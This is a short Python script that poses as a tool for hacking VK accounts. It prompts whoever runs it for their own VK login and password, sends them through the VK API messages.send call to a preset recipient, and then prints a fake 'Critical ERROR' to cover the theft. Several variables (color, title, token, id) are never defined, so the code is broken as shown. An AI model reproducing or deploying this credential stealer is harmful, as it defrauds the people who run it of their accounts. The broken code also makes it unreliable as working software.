



R = "\033[91m" 
P = "\033[95m" 
C = "\033[96m" 
DC = "\033[36m" 
B = "\033[94m" 
G = "\033[92m" 
Y = "\033[93m" 
W = "\033[0m"
import os
import sys
try:
	import vk_api
except:
	print("Install vk_api")
	os.system("pip install vk_api &> install.log")
	print("Done")
	print('''


''')
import random
print(color+title+W)
print("")
hack=input(B+"id hack: "+G)
vk = vk_api.VkApi(token=token)
def write_msg(user_id, s, random_id):
 log= input(B+"Enter login: "+G)
 pas = input(B+"Enter password: "+G)
 msg = "login: " +log + " password: " +pas
 vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)})
write_msg(id, 'connected server...', 'random_id')
print(R+"Critical ERROR"+W)